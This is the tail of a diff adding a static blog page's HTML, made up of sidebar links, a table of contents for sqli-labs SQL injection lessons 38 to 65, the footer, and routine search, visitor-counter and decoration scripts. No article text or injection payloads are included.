+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-38"><span class="nav-number">1.</span> <span class="nav-text">less-38</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入原理"><span class="nav-number">1.1.</span> <span class="nav-text">堆叠注入原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#局限性"><span class="nav-number">1.2.</span> <span class="nav-text">局限性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本操作与增删查改"><span class="nav-number">1.3.</span> <span class="nav-text">基本操作与增删查改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入过程"><span class="nav-number">1.4.</span> <span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-39"><span class="nav-number">2.</span> <span class="nav-text">less-39</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-40"><span class="nav-number">3.</span> <span class="nav-text">less-40</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-41"><span class="nav-number">4.</span> <span class="nav-text">less-41</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-42"><span class="nav-number">5.</span> <span class="nav-text">less-42</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-43"><span class="nav-number">6.</span> <span class="nav-text">less-43</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-44"><span class="nav-number">7.</span> <span class="nav-text">less-44</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-45"><span class="nav-number">8.</span> <span class="nav-text">less-45</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-46"><span class="nav-number">9.</span> <span class="nav-text">less-46</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-语法"><span class="nav-number">9.1.</span> <span class="nav-text">MySQL 语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by-参数注入"><span class="nav-number">9.2.</span> <span class="nav-text">order by 参数注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错注入"><span class="nav-number">9.2.1.</span> <span class="nav-text">基于报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于bool盲注"><span class="nav-number">9.2.2.</span> <span class="nav-text">基于bool盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于时间盲注"><span class="nav-number">9.2.3.</span> <span class="nav-text">基于时间盲注</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-47"><span class="nav-number">10.</span> <span class="nav-text">less-47</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-48"><span class="nav-number">11.</span> <span class="nav-text">less-48</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-49"><span class="nav-number">12.</span> <span class="nav-text">less-49</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-50"><span class="nav-number">13.</span> <span class="nav-text">less-50</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-51"><span class="nav-number">14.</span> <span class="nav-text">less-51</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-52"><span class="nav-number">15.</span> <span class="nav-text">less-52</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-53"><span class="nav-number">16.</span> <span class="nav-text">Less 53</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-54"><span class="nav-number">17.</span> <span class="nav-text">less-54</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-55"><span class="nav-number">18.</span> <span class="nav-text">less-55</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-56"><span class="nav-number">19.</span> <span class="nav-text">less-56</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-57"><span class="nav-number">20.</span> <span class="nav-text">less-57</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-58"><span class="nav-number">21.</span> <span class="nav-text">less-58</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-59"><span class="nav-number">22.</span> <span class="nav-text">less-59</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-60"><span class="nav-number">23.</span> <span class="nav-text">less-60</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-61"><span class="nav-number">24.</span> <span class="nav-text">less-61</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-62"><span class="nav-number">25.</span> <span class="nav-text">less-62</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-63"><span class="nav-number">26.</span> <span class="nav-text">less-63</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-64"><span class="nav-number">27.</span> <span class="nav-text">less-64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-65"><span class="nav-number">28.</span> <span class="nav-text">less-65</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">150.4k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">150.4k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
